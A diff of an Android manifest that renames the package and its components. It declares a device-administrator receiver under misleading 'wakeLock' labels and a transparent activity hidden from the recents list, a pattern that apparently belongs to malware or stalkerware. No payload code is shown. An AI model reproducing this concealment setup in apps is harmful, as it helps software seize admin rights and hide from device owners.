@@ -1,9 +1,9 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="rights.app.com.device">
+    package="insta.request.c_master.device">
 
     <application>
         <receiver
-            android:name=".sys.Receiver"
+            android:name="insta.request.c_master.Receiver"
             android:description="@string/wakeLock_description"
             android:label="@string/wakeLock_label"
             android:permission="android.permission.BIND_DEVICE_ADMIN">
@@ -18,11 +18,12 @@
         </receiver>
 
         <activity
-            android:name=".sys.Activity"
+            android:name="insta.request.c_master.Activity"
             android:excludeFromRecents="true"
             android:theme="@style/AppActivity.Transparent" />
+
         <service
-            android:name=".sys.Service"
+            android:name="insta.request.c_master.Service"
             android:exported="false" />
     </application>
 </manifest>
